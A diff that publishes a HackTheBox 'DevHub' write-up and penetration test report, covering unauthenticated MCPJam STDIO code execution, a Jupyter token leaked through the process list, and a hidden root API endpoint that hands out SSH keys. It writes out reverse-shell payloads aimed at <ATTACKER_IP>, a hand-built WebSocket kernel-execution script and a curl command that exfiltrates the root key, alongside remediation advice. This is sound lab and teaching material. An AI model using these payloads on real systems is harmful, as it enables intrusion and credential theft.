@@ -1,21 +1,429 @@
 # DevHub
 
 **Platform:** HackTheBox
+**OS:** Linux
+**Tags:** MCPJam, STDIO RCE, Jupyter, Token Leak, WebSocket, Hidden Endpoint, SSH Key Exfil
 **Date:** 2026-09-21
 
-Active machine - content will be published upon retirement.
+An internal developer platform exposing three services, and the landing page tells you exactly what they are. MCPJam Inspector on port 6274 has no authentication and supports STDIO transport, which means arbitrary process execution on the server. The Jupyter analytics server runs internally as `analyst` with its token visible in `ps aux`. From `analyst`, a root-owned Flask API called OpsMCP has a hidden endpoint that was not included in the tool listing but is still callable. It dumps root's SSH private key when sent the hardcoded API key found in the source code.
+
+## 1. Enumeration
+
+```bash
+nmap -sC -sV -p- <TARGET_IP>
+```
+
+```
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp   open  http    nginx 1.18.0
+6274/tcp open  http    MCPJam Inspector
+```
+
+Default port scan shows SSH and nginx. Running a full scan finds port 6274. Port 80 redirects to `devhub.htb`. Added to `/etc/hosts`. The landing page immediately outlines the platform:
+
+```
+MCP Inspector       - Active - Port 6274
+Analytics Dashboard - Internal Only - localhost:8888
+Code Repository     - Maintenance Mode
+Stack: Node.js, Python 3, Jupyter, MCP Protocol
+```
+
+Directory brute on the main app found nothing beyond the landing page.
+
+## 2. Foothold: MCPJam STDIO RCE (shell as mcp-dev)
+
+MCPJam Inspector is a dev tool for testing MCP servers. It supports STDIO transport, which means the backend spawns a local process and communicates over its stdin/stdout. This instance has no authentication. Any STDIO command you supply executes on the server.
+
+Typing a reverse shell directly into the Command field fails because the backend calls `child_process.spawn(command, args)` without a shell between them, so the full string is treated as a binary name and is not found. The fix is to use MCPJam's Import JSON feature, which uses the standard MCP server config schema and correctly separates the command from its arguments:
+
+```json
+{
+  "mcpServers": {
+    "Analytics": {
+      "command": "bash",
+      "args": ["-c", "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"]
+    }
+  }
+}
+```
+
+Paste into Import JSON, start a listener, click Connect:
+
+```
+[+] [New Reverse Shell] => devhub <TARGET_IP> mcp-dev(1001)
+mcp-dev@devhub:/opt/mcpjam$ id
+uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
+```
+
+`mcp-dev`'s home is empty of anything useful. `analyst`'s home directory is permission denied. The Jupyter server on localhost is the next step.
+
+**Dead end:** Tried the HTTP/SSE transport first by pointing it at a listener on the attack machine to confirm outbound connectivity. The box made requests back, confirming it can reach us. But SSE transport only proxies communication to an MCP server; it does not execute local commands. STDIO is the code execution path.
+
+## 3. Lateral movement: mcp-dev to analyst (Jupyter token via ps)
+
+The landing page mentioned a Jupyter server on `localhost:8888`. Confirmed it is up and requiring a token:
+
+```bash
+curl -skv http://localhost:8888
+```
+
+```
+HTTP/1.1 302 Found
+Location: /lab?
+...
+WWW-Authenticate: token
+```
+
+Jupyter passes its token on the command line at startup. Anyone who can read the process list gets the token:
+
+```bash
+ps aux | grep -i jupyter
+```
+
+```
+analyst  1087  ... jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser \
+         --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
+root     1093  ... /opt/opsmcp/server.py
+```
+
+Token in hand. Also noted a root-owned Flask process at `/opt/opsmcp/server.py` for later. The OpsMCP source is owned by `analyst` and not readable by `mcp-dev`.
+
+Confirmed authentication works:
+
+```bash
+curl -sk "http://localhost:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
+# returns JupyterLab HTML
+```
+
+No WebSocket tooling was available on the box. Created a kernel via the plain REST API instead, using an Authorization header to avoid the XSRF cookie check:
+
+```bash
+curl -sk -X POST \
+  -H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
+  http://localhost:8888/api/kernels
+```
+
+```
+{"id": "c22972a9-ab1a-4f3e-b5cd-ca7a83f4f989", "name": "python3", ...}
+```
+
+Then wrote a pure-stdlib Python script to perform the WebSocket handshake manually (RFC 6455 frame encoding) and send an `execute_request` message on the kernel's shell channel:
+
+```python
+# /tmp/.ws.py
+import socket, base64, os, json, struct, time, uuid
+
+HOST = "localhost"
+PORT = 8888
+KERNEL_ID = "c22972a9-ab1a-4f3e-b5cd-ca7a83f4f989"
+TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
+PATH = f"/api/kernels/{KERNEL_ID}/channels?token={TOKEN}"
+
+key = base64.b64encode(os.urandom(16)).decode()
+req = (f"GET {PATH} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
+       "Upgrade: websocket\r\nConnection: Upgrade\r\n"
+       f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
+
+s = socket.create_connection((HOST, PORT))
+s.sendall(req.encode())
+print(s.recv(4096)[:200])
+
+def send_frame(sock, data):
+    payload = data.encode()
+    length = len(payload)
+    mask = os.urandom(4)
+    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
+    if length <= 125:
+        header = struct.pack("!BB", 0x81, 0x80 | length)
+    elif length <= 65535:
+        header = struct.pack("!BBH", 0x81, 0x80 | 126, length)
+    else:
+        header = struct.pack("!BBQ", 0x81, 0x80 | 127, length)
+    sock.sendall(header + mask + masked)
+
+code = "import os,pty,socket;s=socket.socket();s.connect(('<ATTACKER_IP>',5555));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/bash')"
+
+msg = {
+    "header": {"msg_id": str(uuid.uuid4()), "username": "mcp-dev",
+               "session": str(uuid.uuid4()), "msg_type": "execute_request", "version": "5.3"},
+    "parent_header": {}, "metadata": {},
+    "content": {"code": code, "silent": False, "store_history": True,
+                "user_expressions": {}, "allow_stdin": False, "stop_on_error": True},
+    "channel": "shell"
+}
+
+send_frame(s, json.dumps(msg))
+time.sleep(2)
+try:
+    print(s.recv(65536))
+except Exception as e:
+    print(e)
+```
+
+```
+b'HTTP/1.1 101 Switching Protocols...'
+
+[+] [New Reverse Shell] => devhub <TARGET_IP> analyst(1002)
+analyst@devhub:~$ id
+uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
+```
+
+## 4. Privilege escalation: OpsMCP Hidden Endpoint
+
+As `analyst`, the previously unreadable source file is now accessible:
+
+```bash
+cat /opt/opsmcp/server.py
+```
+
+Key findings in the Flask app running as root on `127.0.0.1:5000`:
+
+- Hardcoded API key in plaintext: `opsmcp_secret_key_4f5a6b7c8d9e0f1a`
+- Hidden tool `ops._admin_dump` not returned by `/tools/list` but callable via `/tools/call`; reads and returns `/root/.ssh/id_rsa`
+
+`/tools/list` only returns the visible tools (`ops.system_status`, `ops.list_services`, `ops.check_disk`, `ops.view_logs`). The hidden tools are omitted from that listing but remain callable. Omitting an endpoint from a discovery response is not access control.
+
+```bash
+curl -s http://localhost:5000/tools/call \
+  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
+  -H "Content-Type: application/json" \
+  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
+```
+
+```
+{"root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\n...\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
+```
+
+Saved the key locally, set permissions, and SSH'd in as root:
+
+```bash
+chmod 600 root_id_rsa
+ssh -i root_id_rsa root@<TARGET_IP>
+```
+
+```
+root@devhub:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## 5. Flags
+
+- User: `redacted`
+- Root: `redacted`
 
 ---
 
 ## Penetration Test Report
 
+**Target:** devhub.htb
+**Address:** <TARGET_IP>
 **Assessment type:** External network & web application assessment
 **Assessment date:** 21 September 2026
-**Status:** Active - Embargoed
-**Environment:** HackTheBox laboratory assessment
+**Environment:** HackTheBox laboratory assessment  |  Linux
 **Prepared by:** Ledion Mujaj
 **Reference:** HTB-DVH-01
 
-> **Report Embargoed** - Full report will be published upon machine retirement.
+---
+
+## 1. Executive Summary
+
+Testing of **devhub.htb** identified four findings that together produced full root compromise. MCPJam Inspector was exposed on port 6274 with no authentication and STDIO transport enabled, allowing any visitor to execute arbitrary processes on the server. A shell was obtained as `mcp-dev`. The Jupyter analytics server running internally as `analyst` passed its authentication token on the command line, where it was visible to any local user via the process list. A kernel was created via the REST API and a WebSocket execute request was used to spawn a shell as `analyst`. From `analyst`, the source code of a root-owned Flask API called OpsMCP was readable and contained a hardcoded API key. The API exposed a hidden administrative endpoint that was not included in the tool listing but accepted the same key and returned root's SSH private key when called directly. That key was used to authenticate via SSH as root.
+
+**Priority recommendations:**
+
+1. Place MCPJam Inspector behind authentication, or disable STDIO transport and restrict the service to authorised users on trusted networks.
+2. Configure Jupyter to use a secure token or password stored in a config file rather than passing it on the command line. Restrict the Jupyter server to a socket or authenticated proxy.
+3. Remove the hardcoded API key from OpsMCP source code, remove or authenticate the hidden `_admin_dump` endpoint, and rotate root's SSH private key immediately.
 
 ---
+
+## 2. Assessment Scope and Methodology
+
+| Asset | Address | Description |
+|-------|---------|-------------|
+| devhub.htb | <TARGET_IP> | Ubuntu Linux; SSH on 22, nginx on 80, MCPJam Inspector on 6274. |
+
+| Port / Asset | Service | Observed detail |
+|------|---------|----------------|
+| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu |
+| 80/tcp | HTTP | nginx; static landing page listing platform services |
+| 6274/tcp | HTTP | MCPJam Inspector, no authentication, STDIO transport enabled |
+| localhost:8888 | HTTP | Jupyter analytics server, runs as `analyst` |
+| localhost:5000 | HTTP | OpsMCP Flask API, runs as root |
+
+Testing began with a full port scan. MCPJam Inspector on port 6274 was identified and found to have no authentication. A standard MCP JSON config payload using STDIO transport was used to spawn a reverse shell. Post-foothold process enumeration revealed a Jupyter server token exposed on the command line. A kernel was created via the REST API and a manually crafted WebSocket execute request delivered a shell as `analyst`. The OpsMCP source code, now readable from the `analyst` account, contained a hardcoded API key and a hidden endpoint. The endpoint was called directly to retrieve root's SSH private key, which was used to authenticate via SSH as root.
+
+---
+
+## 3. Results Overview
+
+| Reference | Finding | Severity |
+|-----------|---------|----------|
+| F-01 | MCPJam Inspector unauthenticated STDIO transport RCE | **Critical** |
+| F-02 | Jupyter authentication token exposed in process list | **High** |
+| F-03 | OpsMCP hardcoded API key in source code readable by service account | **High** |
+| F-04 | OpsMCP hidden endpoint returns root SSH private key | **Critical** |
+
+**Compromise sequence:**
+
+| Stage | Action | Access obtained |
+|-------|--------|----------------|
+| 01 | MCPJam Inspector on port 6274, no auth, STDIO transport. Sent MCP JSON config with `bash -c` reverse shell payload via Import JSON feature. | Remote shell as `mcp-dev` |
+| 02 | Process list showed Jupyter token `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7` on the command line. Created kernel via REST API. Sent WebSocket execute_request with Python socket/pty reverse shell. | Shell as `analyst` |
+| 03 | Read `/opt/opsmcp/server.py`. Found hardcoded key `opsmcp_secret_key_4f5a6b7c8d9e0f1a` and hidden tool `ops._admin_dump`. Called endpoint to retrieve root SSH private key. SSH'd as root. | Root shell |
+
+---
+
+## 4.1 MCPJam Inspector Unauthenticated STDIO Transport RCE
+
+### F-01   port 6274 -- MCPJam no-auth STDIO RCE - CRITICAL
+
+| Field | Detail |
+|-------|--------|
+| Description | MCPJam Inspector was running on port 6274 with no authentication and STDIO transport enabled. STDIO transport causes the backend to spawn a local OS process and communicate with it over stdin/stdout using the MCP protocol. By supplying a crafted MCP server configuration via the Import JSON feature, an attacker can specify any command as the `command` field, causing the server to execute it as the user running MCPJam. No credentials or prior access are required. |
+| Prerequisites | Network access to port 6274. No prior credentials required. |
+| Impact | Unauthenticated remote code execution as the `mcp-dev` service account. Full filesystem access for that account and a foothold for further enumeration. |
+| Affected system | devhub.htb port 6274 -- MCPJam Inspector, STDIO transport |
+| CVSS 3.1 | 9.8 -- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
+| CWE | CWE-306: Missing Authentication for Critical Function |
+
+**Steps to reproduce:**
+
+1. Start a listener: `penelope -p 4444`
+2. Browse to `http://<TARGET_IP>:6274/`
+3. Use Import JSON with: `{"mcpServers": {"x": {"command": "bash", "args": ["-c", "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"]}}}`
+4. Click Connect.
+5. Receive shell as `mcp-dev`.
+
+**Evidence:**
+
+```
+mcp-dev@devhub:/opt/mcpjam$ id
+uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
+```
+
+Attacker IP redacted.
+
+**Remediation:** Disable STDIO transport on any MCPJam Inspector instance accessible over a network. If STDIO transport is operationally required, place the service behind authentication and restrict access to authorised users on a trusted network. Consider running MCPJam only on loopback or in isolated environments for development use.
+
+**Verification:** Confirm MCPJam Inspector requires authentication before accepting any transport configuration. Confirm STDIO transport is disabled or restricted. Verify the Import JSON path no longer results in process execution without credentials.
+
+---
+
+## 4.2 Jupyter Authentication Token Exposed in Process List
+
+### F-02   ps aux -- Jupyter token in command line arguments - HIGH
+
+| Field | Detail |
+|-------|--------|
+| Description | The Jupyter analytics server was started with the `--ServerApp.token` flag passing the authentication token directly as a command-line argument. On Linux, command-line arguments for all processes are visible to any local user via `/proc` or tools such as `ps`. Any user with a local shell on the host obtained the Jupyter token and could authenticate to the server as `analyst`. |
+| Prerequisites | Local authenticated access as any user (available via F-01). |
+| Impact | Full authenticated access to the Jupyter server running as `analyst`. Ability to create kernels and execute arbitrary Python code as `analyst`. |
+| Affected system | devhub.htb -- Jupyter server process, `analyst` user |
+| CVSS 3.1 | 7.5 -- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
+| CWE | CWE-214: Invocation of Process Using Visible Sensitive Information |
+
+**Steps to reproduce:**
+
+1. From the `mcp-dev` shell: `ps aux | grep jupyter`
+2. Extract the token from the `--ServerApp.token` argument.
+3. `curl -sk -X POST -H "Authorization: token <TOKEN>" http://localhost:8888/api/kernels`
+4. Use the returned kernel ID to execute code via the kernel channels WebSocket.
+
+**Evidence:**
+
+```
+mcp-dev@devhub:/opt/mcpjam$ ps aux | grep jupyter
+analyst  1087  ... jupyter-lab ... --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
+
+analyst@devhub:~$ id
+uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
+```
+
+Token redacted in excerpt above.
+
+**Remediation:** Configure Jupyter to read its token or password from a config file rather than a command-line argument. Set `ServerApp.token` in `~/.jupyter/jupyter_server_config.py` and ensure the file has mode 600. Alternatively, disable token authentication and use a reverse proxy with proper session-based authentication. Rotate the exposed token immediately.
+
+**Verification:** Confirm the Jupyter token is no longer visible in the process list. Confirm the exposed token has been rotated. Verify the Jupyter server requires valid credentials before granting kernel access.
+
+---
+
+## 4.3 OpsMCP Hardcoded API Key in Source Code
+
+### F-03   /opt/opsmcp/server.py -- hardcoded API key - HIGH
+
+| Field | Detail |
+|-------|--------|
+| Description | The OpsMCP Flask application stored its API key as a hardcoded string literal in the source file `/opt/opsmcp/server.py`. The file was owned by `analyst` and readable from the `analyst` account. Any user who reaches the `analyst` account obtains the key and can call all OpsMCP endpoints, including undocumented ones. |
+| Prerequisites | Read access to `/opt/opsmcp/server.py` (available from the `analyst` account, obtained via F-01 and F-02). |
+| Impact | Full authenticated access to the OpsMCP API, including hidden administrative endpoints. Combined with F-04, enables retrieval of root's SSH private key. |
+| Affected system | devhub.htb -- `/opt/opsmcp/server.py`; hardcoded key `opsmcp_secret_key_4f5a6b7c8d9e0f1a` |
+| CVSS 3.1 | 7.5 -- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
+| CWE | CWE-798: Use of Hard-coded Credentials |
+
+**Steps to reproduce:**
+
+1. From the `analyst` shell: `cat /opt/opsmcp/server.py`
+2. Locate the `API_KEY` constant: `opsmcp_secret_key_4f5a6b7c8d9e0f1a`
+3. Use the key to authenticate requests to `localhost:5000`.
+
+**Evidence:**
+
+```python
+# /opt/opsmcp/server.py (excerpt)
+API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
+```
+
+**Remediation:** Remove the hardcoded API key from source code. Load it at runtime from an environment variable or a secrets management system with access controls appropriate to the service's privilege level. Rotate the exposed key immediately. Ensure the source file is not readable by any account other than the process owner.
+
+**Verification:** Confirm the API key is no longer present in source code. Confirm the key has been rotated. Confirm the source file permissions prevent access from unprivileged accounts.
+
+---
+
+## 4.4 OpsMCP Hidden Endpoint Returns Root SSH Private Key
+
+### F-04   /tools/call ops._admin_dump -- root key exfil - CRITICAL
+
+| Field | Detail |
+|-------|--------|
+| Description | The OpsMCP Flask API running as root exposed a tool named `ops._admin_dump` that was not included in the response from `/tools/list` but remained callable via `/tools/call`. When called with `target: "ssh_keys"` and the hardcoded API key (see F-03), the endpoint read `/root/.ssh/id_rsa` and returned the private key in the JSON response. Security by obscurity, omitting an endpoint from a discovery listing, is not access control. The endpoint was reachable from any account with the key. |
+| Prerequisites | Knowledge of the API key (from F-03) and local access to `localhost:5000`. |
+| Impact | Root SSH private key obtained. Direct SSH authentication as root. Full compromise of the host. |
+| Affected system | devhub.htb -- OpsMCP `localhost:5000/tools/call`; tool `ops._admin_dump`; root SSH key at `/root/.ssh/id_rsa` |
+| CVSS 3.1 | 9.1 -- AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H |
+| CWE | CWE-284: Improper Access Control |
+
+**Steps to reproduce:**
+
+1. `curl -s http://localhost:5000/tools/call -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'`
+2. Extract `root_private_key` from response.
+3. `chmod 600 root_id_rsa && ssh -i root_id_rsa root@<TARGET_IP>`
+
+**Evidence:**
+
+```
+analyst@devhub:~$ curl -s http://localhost:5000/tools/call \
+  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
+  -H "Content-Type: application/json" \
+  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
+{"root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\n...\n-----END OPENSSH PRIVATE KEY-----\n"}
+
+root@devhub:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**Remediation:** Remove the `ops._admin_dump` endpoint entirely. If any administrative dump functionality is retained, it must be authenticated independently with a separate high-privilege credential, not the same shared API key, and must not be callable from any non-root account's network context. Rotate root's SSH private key immediately and audit all authorised keys across the host. Do not run administrative APIs as root where local service accounts can reach them.
+
+**Verification:** Confirm `ops._admin_dump` returns a 404 or is removed from the codebase. Confirm root's SSH private key has been rotated. Confirm the API key has been rotated. Verify no local account can retrieve a root credential from the OpsMCP service.
+
+---
+
+## 5. Remediation and Assessment Closeout
+
+| Priority | Action | Reference |
+|----------|--------|-----------|
+| Immediate | Rotate root SSH private key. Remove or disable the ops._admin_dump endpoint. Rotate the OpsMCP API key and remove it from source code. | F-04, F-03 |
+| Immediate | Disable STDIO transport on MCPJam Inspector or place it behind authentication. | F-01 |
+| High | Rotate the exposed Jupyter token. Configure Jupyter to store its token in a config file, not command-line arguments. | F-02 |
+
+**Test artefacts:** `/tmp/.ws.py` (WebSocket execution script) and `root_id_rsa` (extracted root SSH key, stored on the attack machine) were created during testing. The local key file should be deleted. No persistent files were written to the target beyond the shell sessions.
